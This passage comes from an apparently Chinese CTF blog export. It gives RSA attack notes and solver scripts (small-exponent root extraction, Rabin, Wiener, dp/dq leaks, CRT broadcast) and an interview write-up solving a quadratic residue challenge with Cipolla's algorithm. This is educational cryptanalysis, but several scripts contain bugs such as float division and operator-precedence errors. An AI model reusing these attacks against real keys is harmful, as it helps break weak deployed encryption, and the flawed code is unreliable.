<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=<span class="number">2</span></span><br><span class="line">c=<span class="number">9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529</span></span><br><span class="line">求明文m?</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c = <span class="number">9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529</span></span><br><span class="line">m = gmpy2.isqrt(c)</span><br><span class="line">m = <span class="built_in">int</span>(m)</span><br><span class="line">m_text = libnum.n2s(m)  <span class="comment">#将 十六进制转为 字符</span></span><br><span class="line">print(m_text)</span><br></pre></td></tr></table></figure>
<p>也有可能e的三次方会比n大但是大不了太多，可以进行爆破,每次多加一个n。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">n</span>=<span class="number">0</span>x<span class="number">9683</span>f<span class="number">5</span>f<span class="number">8073</span>b<span class="number">6</span>cd<span class="number">9</span>df<span class="number">96</span>ee<span class="number">4</span>dbe<span class="number">6629</span>c<span class="number">7965</span>e<span class="number">1</span>edd<span class="number">2854</span>afa<span class="number">113</span>d<span class="number">80</span>c<span class="number">44</span>f<span class="number">5</span>dfcf<span class="number">030</span>a<span class="number">18</span>c<span class="number">1</span>b<span class="number">2</span>ff<span class="number">40575</span>fe<span class="number">8</span>e<span class="number">222230</span>d<span class="number">7</span>bb<span class="number">5</span>b<span class="number">6</span>dd<span class="number">8</span>c<span class="number">419</span>c<span class="number">9</span>d<span class="number">4</span>bca<span class="number">1</span>a<span class="number">7</span>e<span class="number">84440</span>a<span class="number">2</span>a<span class="number">87</span>f<span class="number">691</span>e<span class="number">2</span>c<span class="number">0</span>c<span class="number">76</span>caaab<span class="number">61492</span>db<span class="number">143</span>a<span class="number">61132</span>f<span class="number">584</span>ba<span class="number">874</span>a<span class="number">98363</span>c<span class="number">23</span>e<span class="number">93218</span>ac<span class="number">83</span>d<span class="number">1</span>dd<span class="number">715</span>db<span class="number">6711009</span>ceda<span class="number">2</span>a<span class="number">31820</span>bbacaf<span class="number">1</span>b<span class="number">6171</span>bbaa<span class="number">68</span>d<span class="number">1</span>be<span class="number">76</span>fe<span class="number">986</span>e<span class="number">4</span>b<span class="number">4</span>c<span class="number">1</span>b<span class="number">66</span>d<span class="number">10</span>af<span class="number">25</span></span><br><span class="line"><span class="attribute">e</span>=<span class="number">0</span>x<span class="number">3</span></span><br><span class="line"><span class="attribute">c</span>=<span class="number">0</span>x<span class="number">8541</span>ee<span class="number">560</span>f<span class="number">77</span>d<span class="number">8</span>fe<span class="number">536</span>d<span class="number">48</span>eab<span class="number">425</span>b<span class="number">0505</span>e<span class="number">86178</span>e<span class="number">6</span>ffefa<span class="number">1</span>b<span class="number">0</span>c<span class="number">37</span>ccbfc<span class="number">6</span>cb<span class="number">5</span>f<span class="number">9</span>a<span class="number">7727</span>baeb<span class="number">3916356</span>d<span class="number">6</span>fce<span class="number">3205</span>cd<span class="number">4</span>e<span class="number">586</span>a<span class="number">1</span>cc<span class="number">407703</span>b<span class="number">3</span>f<span class="number">709</span>e<span class="number">2011</span>d<span class="number">7</span>b<span class="number">66</span>eaaeea<span class="number">9</span>e<span class="number">381</span>e<span class="number">595</span>b<span class="number">4</span>d<span class="number">515</span>c<span class="number">433682</span>eb<span class="number">3906</span>d<span class="number">9870</span>fadbffd<span class="number">0695</span>c<span class="number">0168</span>aa<span class="number">26447</span>f<span class="number">7</span>a<span class="number">049</span>c<span class="number">260456</span>f<span class="number">51</span>e<span class="number">937</span>ce<span class="number">75</span>b<span class="number">74</span>e<span class="number">5</span>c<span class="number">3</span>c<span class="number">2</span>bd<span class="number">7709</span>b<span class="number">981898016</span>a<span class="number">3</span>a<span class="number">18</span>f<span class="number">15</span>ae<span class="number">99763</span>ff<span class="number">40805</span>aa</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+i*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        print(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="4-Rabin加密算法"><a href="#4-Rabin加密算法" class="headerlink" title="4.Rabin加密算法"></a>4.Rabin加密算法</h3><p>Rabin加密算法是一种RSA 的衍生算法，特征是e=2.</p>
<h4 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h4><script type="math/tex; mode=display">
c\quad = \quad m^2 \quad mod\quad n</script><h4 id="解密原理"><a href="#解密原理" class="headerlink" title="解密原理"></a>解密原理</h4><ul>
<li>计算出 <script type="math/tex; mode=display">
m_q 和 m_p</script></li>
</ul>
<script type="math/tex; mode=display">
m_p\quad=\quad\sqrt{c}\quad mod\quad p</script><script type="math/tex; mode=display">
m_q\quad= \quad \sqrt{c}\quad mod \quad q</script><ul>
<li>扩展欧几里得计算出a和b</li>
</ul>
<script type="math/tex; mode=display">
y_p*p \quad+\quad y_q*q\quad=\quad1</script><ul>
<li>解出四个明文</li>
</ul>
<script type="math/tex; mode=display">
a\quad=\quad( y_p*p*m_q\quad {+}\quad y_q*q*m_p )\quad mod n</script><script type="math/tex; mode=display">
b\quad=\quad n\quad-\quad a</script><script type="math/tex; mode=display">
a\quad=\quad( y_p*p*m_q\quad {-}\quad y_q*q*m_p )\quad mod n</script><script type="math/tex; mode=display">
{d\quad = \quad n\quad-\quad c}</script><h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span>  </span><br><span class="line">    n = p * q  </span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)  </span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)  </span><br><span class="line">    yp = gmpy2.invert(p, q)  </span><br><span class="line">    yq = gmpy2.invert(q, p)  </span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n  </span><br><span class="line">    rr = n - r  </span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n  </span><br><span class="line">    ss = n - s  </span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)  </span><br></pre></td></tr></table></figure>
<h3 id="5-低解密指数攻击（CTFSHOW-RSA5）"><a href="#5-低解密指数攻击（CTFSHOW-RSA5）" class="headerlink" title="5.低解密指数攻击（CTFSHOW-RSA5）"></a>5.低解密指数攻击（CTFSHOW-RSA5）</h3><p>在RSA中d也称为解密指数。当d比较小的时候，或者说e特别大的时候</p>
<p>适用情况：e过大或过小（一般e过大时使用）可使用算法快速推断出d的值</p>
<p>引用RSA-wiener——attack <a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<p>下下来之后新建一个python库，把.py文件都放进去。引用时会报错，大概就是修改几个import，之后就可以用了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> RSAwienerHacker.RSAwienerHacker</span><br><span class="line">e = <span class="number">284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span></span><br><span class="line">n = <span class="number">468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span></span><br><span class="line">c = <span class="number">350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span></span><br><span class="line"></span><br><span class="line">d = RSAwienerHacker.RSAwienerHacker.hack_RSA(e,n)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="5-dp，dq泄露（已知p、q、dp、dq、c）（BUU-RSA1）"><a href="#5-dp，dq泄露（已知p、q、dp、dq、c）（BUU-RSA1）" class="headerlink" title="5.dp，dq泄露（已知p、q、dp、dq、c）（BUU-RSA1）"></a>5.dp，dq泄露（已知p、q、dp、dq、c）（BUU-RSA1）</h3><p>简单说明dp，dq参数是为了让解密更快的产生</p>
<ul>
<li>dp=d%(p-1)</li>
<li>dq=d%(q-1)</li>
</ul>
<p><img src="/2020/12/19/7/2.jpg" alt="IMG_20201118_224842"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="6-dp泄露"><a href="#6-dp泄露" class="headerlink" title="6.dp泄露"></a>6.dp泄露</h3><p>不同于上面的dp，dq泄露，需要一些其他技巧</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="/2020/12/19/7/3.jpg" alt="3"></p>
<h4 id="求解脚本"><a href="#求解脚本" class="headerlink" title="求解脚本"></a>求解脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getd</span>(<span class="params">n,e,dp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e-<span class="number">1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e-<span class="number">1</span>)/i)+<span class="number">1</span></span><br><span class="line">                q=n/(((dp*e-<span class="number">1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">                phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">                d = gmpy2.invert(e,phi)%phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure>
<h3 id="7-中国剩余定理的应用"><a href="#7-中国剩余定理的应用" class="headerlink" title="7.中国剩余定理的应用"></a>7.中国剩余定理的应用</h3><p><strong>问题：今有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？</strong></p>
<p>这是很典型的中国剩余定理的问题，要明白中国剩余定理，需要明白上述问题的解决方法，自行掌握</p>
<p>给出一个题目的解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">enc=[&#123;<span class="string">&quot;c&quot;</span>: <span class="number">7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247</span>, <span class="string">&quot;e&quot;</span>: <span class="number">10</span>, <span class="string">&quot;n&quot;</span>: <span class="number">30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621</span>&#125;]</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扩展欧几里得&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = egcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span>(<span class="params">pairs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;中国剩余定理&quot;&quot;&quot;</span></span><br><span class="line">    mod_list, remainder_list = [p[<span class="string">&#x27;n&#x27;</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs], [p[<span class="string">&#x27;c&#x27;</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs]</span><br><span class="line">    mod_product = reduce(<span class="keyword">lambda</span> x, y: x * y, mod_list)</span><br><span class="line">    mi_list = [mod_product//x <span class="keyword">for</span> x <span class="keyword">in</span> mod_list]</span><br><span class="line">    mi_inverse = [egcd(mi_list[i], mod_list[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mi_list))]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(remainder_list)):</span><br><span class="line">        x += mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %= mod_product</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s=chinese_remainder(enc)</span><br><span class="line">    print(long_to_bytes(gmpy2.iroot(s,<span class="number">10</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="8-待补充，不同情况下的高低位泄露"><a href="#8-待补充，不同情况下的高低位泄露" class="headerlink" title="8.待补充，不同情况下的高低位泄露"></a>8.待补充，不同情况下的高低位泄露</h3>]]></content>
      <categories>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Python</tag>
        <tag>Rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>某次面试</title>
    <url>/2021/01/19/9/</url>
    <content><![CDATA[<h3 id="三面报告"><a href="#三面报告" class="headerlink" title="三面报告"></a>三面报告</h3><h2 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=<span class="number">2857831458617919915448348973202449428172975402344447845149753833225</span></span><br><span class="line">n=<span class="number">108607598680742993231063442886639267104372363777255285964116381103517303965067</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/19/9/3-1.jpg" alt="avatar"></p>
<p>看着识字感觉有点熟悉，类似与RSA的低加密指数分解攻击，试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">2857831458617919915448348973202449428172975402344447845149753833225</span></span><br><span class="line">n = <span class="number">108607598680742993231063442886639267104372363777255285964116381103517303965067</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(c,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#(mpz(1690512188248851376925542155690365), True)</span></span><br><span class="line"><span class="comment">#另一解n- m[0]</span></span><br><span class="line"><span class="comment">#108607598680742993231063442886639267104372362086743097715265004177975148274702</span></span><br><span class="line">print(long_to_bytes(m[<span class="number">0</span>]))</span><br><span class="line"><span class="comment">#b&#x27;SYC&#123;good_job!&#125;&#x27;</span></span><br><span class="line">print(long_to_bytes(n-m[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<p>在思考一下，和RSA的低加密指数分解攻击有点类似的Rabin算法（是一种基于模平方和模平方根的非对称加密算法）。尝试用yafu，factordb分解n，失败。在验证一下n是不是素数。</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="built_in">isPrime</span>(n))</span><br><span class="line"><span class="meta">#1</span></span><br></pre></td></tr></table></figure>
<p>那就说明不是Rabin加密。</p>
<p>看提示要探索x背后的秘密，回想之前数论学习里面的二次同余式的知识，试一下。</p>
<h2 id="二次剩余"><a href="#二次剩余" class="headerlink" title="二次剩余"></a>二次剩余</h2><p>一个数 a，如果不是p 的倍数且模 p同余于某个数的平方，则称 a为模p 的 <strong>二次剩余</strong> 。而一个不是 p的倍数的数 b，不同余于任何数的平方，则b称 为模 p的 <strong>非二次剩余</strong> 。</p>
<h3 id="是否有解"><a href="#是否有解" class="headerlink" title="是否有解"></a>是否有解</h3><h4 id="引入勒让德符号"><a href="#引入勒让德符号" class="headerlink" title="引入勒让德符号"></a>引入勒让德符号</h4><p><img src="/2021/01/19/9/3-2.jpg" alt="avatar"></p>
<p>通过勒让德符号可以判断一个数 是否为二次剩余，具体判断 是否为 的二次剩余，需要通过欧拉判别准则来实现</p>
<h4 id="欧拉判别准则"><a href="#欧拉判别准则" class="headerlink" title="欧拉判别准则"></a>欧拉判别准则</h4><p><img src="/2021/01/19/9/3-3.jpg" alt="avatar"></p>
<h4 id="证明："><a href="#证明：" class="headerlink" title="证明："></a>证明：<img src="/2021/01/19/9/3-4.jpg" alt="avatar"></h4><h3 id="Cipolla算法"><a href="#Cipolla算法" class="headerlink" title="Cipolla算法"></a>Cipolla算法</h3><p>Cipolla算法是解决二次剩余强有力的工具，一个脑洞大开的算法</p>
<h4 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h4><p><img src="/2021/01/19/9/3-5.jpg" alt="avater"></p>
<p><img src="/2021/01/19/9/3-6.jpg" alt="avater"></p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">2857831458617919915448348973202449428172975402344447845149753833225</span></span><br><span class="line">n = <span class="number">108607598680742993231063442886639267104372363777255285964116381103517303965067</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    a = random.randint(<span class="number">1</span>,n)</span><br><span class="line">    i=a*a - c</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.legendre(i,n) == -<span class="number">1</span>):</span><br><span class="line">        i_sqrt = gmpy2.sqrt(i)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">x = gmpy2.powmod(a+i_sqrt,n+<span class="number">1</span>//<span class="number">2</span>,n)</span><br><span class="line">print(x,-x%n)</span><br></pre></td></tr></table></figure>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">3</span>):</span><br><span class="line">    ans = <span class="built_in">pow</span>(c, (n + <span class="number">1</span>) // <span class="number">4</span>, n)</span><br><span class="line">    print(ans, -ans % n)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>数论</tag>
        <tag>二次剩余</tag>
      </tags>
  </entry>
</search>
